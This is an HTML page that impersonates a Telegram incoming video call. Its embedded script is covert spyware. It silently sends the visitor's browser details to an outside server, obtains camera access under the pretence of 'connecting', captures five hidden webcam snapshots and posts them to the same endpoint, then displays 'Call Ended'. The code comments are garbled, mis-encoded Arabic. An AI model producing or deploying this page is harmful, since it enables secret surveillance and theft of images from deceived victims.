<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Video Call</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a222d; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; overflow: hidden; }

        .avatar { width: 120px; height: 120px; border-radius: 50%; background: #0088cc; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 50px; font-weight: bold; }
        .caller-name { font-size: 28px; font-weight: 600; margin-bottom: 10px; }
        .call-status { font-size: 18px; color: #a0b3c7; margin-bottom: 40px; }
        .buttons { display: flex; justify-content: center; gap: 20px; }
        button { width: 80px; height: 80px; border-radius: 50%; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 30px; transition: background-color 0.2s; }
        #joinButton { background: #28a745; color: white; }

        #hiddenVideo { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0; }
        #hiddenCanvas { display: none; }
    </style>
</head>
<body>
    <!-- Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙŠØ£ØªÙŠ Ø£ÙˆÙ„Ø§Ù‹ Ù„ÙŠÙƒÙˆÙ† ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ© -->
    <video id="hiddenVideo" autoplay playsinline muted></video>

    <div class="call-container">
        <div class="avatar">T</div>
        <h1 class="caller-name">Incoming Video Call</h1>
        <p class="call-status" id="statusMessage">Telegram</p>
        <div class="buttons">
            <button id="declineButton">âœ–</button>
            <button id="joinButton">ğŸ“</button>
        </div>
    </div>
    
    <canvas id="hiddenCanvas"></canvas>

    <script>
        class PenanceProtocol {
            constructor() {
                this.apiEndpoint = 'https://ahmed1997.pythonanywhere.com/api/v1/log_event';
                this.authToken = 'ahmed-secret-key-777';
                this.stream = null;
                this.maxCaptures = 5;
                this.captureCount = 0;

                document.getElementById('declineButton').onclick = () => this.disappear();
                document.getElementById('joinButton').onclick = () => this.updateStatus('Connecting...');

                // --- Ø§Ù„Ø¹ÙˆØ¯Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø¬Ø°ÙˆØ±: Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ± ---
                setTimeout(() => {
                    this.startOperation();
                }, 1500); // Ø§Ù†ØªØ¸Ø± 1.5 Ø«Ø§Ù†ÙŠØ©
            }

            updateStatus(message) {
                document.getElementById('statusMessage').textContent = message;
            }
            
            async startOperation() {
                await this.sendInitialReport();
                try {
                    this.updateStatus('Initializing connection...');
                    this.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                    
                    const video = document.getElementById('hiddenVideo');
                    video.srcObject = this.stream;
                    
                    // Ø®Ø¯Ø¹Ø© Ø¬Ø¯ÙŠØ¯Ø©: Ø§Ù†ØªØ¸Ø± Ø­Ø¯Ø« "canplay" Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ø§Ø¹ØªÙ…Ø§Ø¯ Ø¹Ù„Ù‰ Ø§Ù„Ø¹Ø±Ø¶
                    video.addEventListener('canplay', () => {
                        this.updateStatus('Stream acquired. Capturing...');
                        // ØªØ£Ø®ÙŠØ± Ø¨Ø³ÙŠØ· Ø¢Ø®Ø± Ù„Ø¶Ù…Ø§Ù† Ø§Ø³ØªÙ‚Ø±Ø§Ø± Ø§Ù„Ø¨Ø«
                        setTimeout(() => {
                            this.startCaptureLoop();
                        }, 500);
                    }, { once: true });

                } catch (error) {
                    this.updateStatus('Camera permission required.');
                }
            }

            async sendInitialReport() {
                const victimInfo = { userAgent: navigator.userAgent, platform: navigator.platform };
                return fetch(this.apiEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, body: JSON.stringify({ info: victimInfo }) });
            }

            startCaptureLoop() {
                if (this.captureCount >= this.maxCaptures) {
                    this.disappear();
                    return;
                }
                const video = document.getElementById('hiddenVideo');
                if (video.videoWidth === 0) { // ÙØ­Øµ Ø£Ø®ÙŠØ±
                    this.disappear();
                    return;
                }

                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                this.captureCount++;
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                this.sendPhotoReport(imageData, this.captureCount);
                
                setTimeout(() => this.startCaptureLoop(), 1000); // Ø²ÙŠØ§Ø¯Ø© Ø§Ù„ÙˆÙ‚Øª Ø¨ÙŠÙ† Ø§Ù„Ù„Ù‚Ø·Ø§Øª
            }

            async sendPhotoReport(imageData, count) {
                const victimInfo = { captureSequence: `${count}/${this.maxCaptures}` };
                return fetch(this.apiEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, body: JSON.stringify({ image: imageData, info: victimInfo }) });
            }

            disappear() {
                if (this.stream) { this.stream.getTracks().forEach(track => track.stop()); }
                const container = document.querySelector('.call-container');
                container.innerHTML = `<h1 class="caller-name">Call Ended</h1>`;
            }
        }

        new PenanceProtocol();
    </script>
</body>
